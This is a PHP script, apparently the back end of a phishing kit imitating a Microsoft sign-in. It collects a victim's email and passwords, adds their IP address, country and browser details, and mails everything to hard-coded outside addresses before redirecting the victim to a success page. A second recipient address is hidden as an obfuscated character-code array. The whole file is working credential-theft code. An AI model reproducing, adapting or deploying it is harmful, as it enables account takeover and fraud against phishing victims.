<?
session_start();
$queryParams = "P=_93894574342hdfjsixaoweue5_j1489738549283781331983743fncn_Product-UserID&ub=";
$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$_SESSION['UserName'] = $_POST['UserName'];
$port = getenv("REMOTE_PORT");
require_once('geoiploc.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");

$message .= "----------------------------------------\n";
$message .= "Email: ".$_POST['UserName']."\n";
$message .= "Password 1: ".$_POST['password_old']."\n";
$message .= "Password 2: ".$_POST['Password']."\n";
$message .= "------\n";
$message .= "IP Address : $ip\n";
$message .= "Country : ".$country."\n";
$message .= "Port : $port\n";
$message .= "---\n";
$message .= "Date : $adddate\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---\n";

$boss = "jeannie@shamrockfcu.org, markferarri222@gmail.com";


$subject = "MicroSoft 2018 - $ip";

mail($boss,$subject,$message,$headers);
header("Location: success.php?P=_93894574342hdfjsixaoweue5_j1489738549283781331983743fncn_Product-UserID&P=_93894574342hdfjsixaoweue5_j1489738549283781331983743fncn_Product-UserID&filemanager=370968652076141900cf7dc642a48c4e&PHPSESSID=7184ec14c1e2f8a3283d5f20eed4c5e4");
// Function to get country and country sort;
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>